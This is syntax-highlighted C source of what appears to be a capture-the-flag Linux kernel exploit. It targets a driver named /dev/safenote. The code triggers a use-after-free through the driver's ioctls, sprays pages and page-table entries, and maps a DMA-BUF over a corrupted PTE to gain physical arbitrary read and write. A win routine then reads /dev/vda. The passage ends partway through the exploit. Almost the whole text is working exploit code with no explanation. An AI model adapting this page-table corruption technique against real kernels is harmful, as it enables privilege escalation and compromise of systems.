<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;banzi.h&#34;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">index</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mh">0x1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">index</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x1337</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">del</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">index</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mh">0x1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">index</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x1338</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">delete</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">index</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mh">0x1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">index</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x1339</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">ga</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0xffffffff81000000</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define DMA_HEAP_IOCTL_ALLOC 0xc0184800
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">u64</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">u32</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">dma_heap_allocation_data</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">u64</span> <span class="n">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">u32</span> <span class="n">fd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">u32</span> <span class="n">fd_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">u64</span> <span class="n">heap_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/vda&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[-] Lose...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Win!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Done&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">stop_chunk</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x5</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">spray_chunk</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0xf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">N_PAGESPRAY</span> <span class="o">=</span> <span class="mh">0x800</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 0xffffffffc0203420
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">poc</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">set_cpu_affinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">getpid</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="nf">save_state</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// init_namespace();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">filefds</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">page_spray</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">uaffds</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">mmap_addr</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x4000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x4000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">Data</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">dmafd</span> <span class="o">=</span> <span class="nf">creat</span><span class="p">(</span><span class="s">&#34;/dev/dma_heap/system&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">dmafd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;/dev/dma_heap/system&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/safenote&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;init sk-buffers&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">init_sk_buffer</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_PAGESPRAY</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">page_spray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="mh">0xdead0000UL</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mh">0x10000UL</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                            <span class="mh">0x8000</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_SHARED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">page_spray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;mmap&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">spray_chunk</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">stop_chunk</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">del</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">delete</span><span class="p">(</span><span class="n">stop_chunk</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">stop_chunk</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">spray_chunk</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">del</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">filefds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/bin/nsjail&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">filefds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__pause</span><span class="p">(</span><span class="s">&#34;debug&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">del</span><span class="p">(</span><span class="n">stop_chunk</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">uaffds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/tmp/uaf&#34;</span><span class="p">,</span><span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_RDWR</span><span class="p">,</span><span class="mo">0666</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">uaffds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">write</span><span class="p">(</span><span class="n">uaffds</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="s">&#34;AAAAAA&#34;</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">found_fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nf">write</span><span class="p">(</span><span class="n">filefds</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="s">&#34;AAA&#34;</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="n">found_fd</span> <span class="o">=</span> <span class="n">filefds</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;found filefd: %x&#34;</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">found_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;try again&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">uaffds</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">found_fd</span> <span class="o">==</span> <span class="n">filefds</span><span class="p">[</span><span class="n">i</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">filefds</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Allocating PTEs...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_PAGESPRAY</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="n">page_spray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">j</span><span class="o">*</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">=</span> <span class="sc">&#39;A&#39;</span> <span class="o">+</span> <span class="n">j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">dma_buf_fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">dma_heap_allocation_data</span> <span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">.</span><span class="n">fd_flags</span> <span class="o">=</span> <span class="n">O_RDWR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">.</span><span class="n">heap_flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">.</span><span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">ioctl</span><span class="p">(</span><span class="n">dmafd</span><span class="p">,</span> <span class="n">DMA_HEAP_IOCTL_ALLOC</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;DMA_HEAP_IOCTL_ALLOC&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] dma_buf_fd: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">dma_buf_fd</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Allocate many PTEs (2)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">N_PAGESPRAY</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_PAGESPRAY</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="n">page_spray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">j</span><span class="o">*</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">=</span> <span class="sc">&#39;A&#39;</span> <span class="o">+</span> <span class="n">j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">dup</span><span class="p">(</span><span class="n">found_fd</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;dup&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Searching for overlapping page...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Search for page that overlaps with other physical page
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">void</span> <span class="o">*</span><span class="n">evil</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_PAGESPRAY</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// We wrote &#39;H&#39;(=&#39;A&#39;+7) but if it changes the PTE overlaps with the file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="n">page_spray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="mi">7</span><span class="o">*</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">!=</span> <span class="sc">&#39;A&#39;</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// +38h: f_count
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">evil</span> <span class="o">=</span> <span class="n">page_spray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x7000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Found overlapping page: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">evil</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">evil</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="nf">loge</span><span class="p">(</span><span class="s">&#34;target not found :(&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Place PTE entry for DMA buffer onto controllable PTE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Remapping...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">munmap</span><span class="p">(</span><span class="n">evil</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">dmabuf</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="n">evil</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">MAP_SHARED</span> <span class="o">|</span> <span class="n">MAP_POPULATE</span><span class="p">,</span> <span class="n">dma_buf_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">dmabuf</span> <span class="o">=</span> <span class="sc">&#39;0&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">     <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">   * Get physical AAR/AAW
</span></span></span><span class="line"><span class="cl"><span class="cm">   */</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Corrupt physical address of DMA-BUF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">dup</span><span class="p">(</span><span class="n">found_fd</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nf">loge</span><span class="p">(</span><span class="s">&#34;dup&#34;</span><span class="p">);</span>
